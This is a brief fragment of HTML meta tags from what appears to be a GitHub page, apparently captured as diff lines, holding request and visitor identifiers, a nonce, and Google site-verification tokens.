-  <meta name="request-id" content="1246:3087:6BE375:79E87D:601285A5" data-pjax-transient="true" /><meta name="html-safe-nonce" content="91e589bc1c81fb071eb9659d65ff172d40a3beab2b323ea68c49d35e0d8f622a" data-pjax-transient="true" /><meta name="visitor-payload" content="eyJyZWZlcnJlciI6bnVsbCwicmVxdWVzdF9pZCI6IjEyNDY6MzA4Nzo2QkUzNzU6NzlFODdEOjYwMTI4NUE1IiwidmlzaXRvcl9pZCI6IjczNDgzNTQ4NjgxNjg5NjM5MSIsInJlZ2lvbl9lZGdlIjoiYXAtc291dGhlYXN0LTEiLCJyZWdpb25fcmVuZGVyIjoiaWFkIn0=" data-pjax-transient="true" /><meta name="visitor-hmac" content="ec347cae631653de2523b1718e8fc866f693b32169483d04d3150b59c990215f" data-pjax-transient="true" />
-
-
-
-  <meta name="github-keyboard-shortcuts" content="" data-pjax-transient="true" />
-
-  
-
-  <meta name="selected-link" value="/login" data-pjax-transient>
-
-    <meta name="google-site-verification" content="c1kuD-K2HIVF635lypcsWPoD4kilo5-jA_wBFyT4uMY">
   <meta name="google-site-verification" content="KT5gs8h0wvaagLKAVWq8bbeNwnZZK1r1XQysX3xurLU">
   <meta name="google-site-verification" content="ZzhVyEFwb7w3e0-uOTltm8Jsck2F5StVihD0exw2fsA">
   <meta name="google-site-verification" content="GXs5KoUUkNCoaAZn7wPN-t01Pywp9M3sEjnt_3_ZWPc">
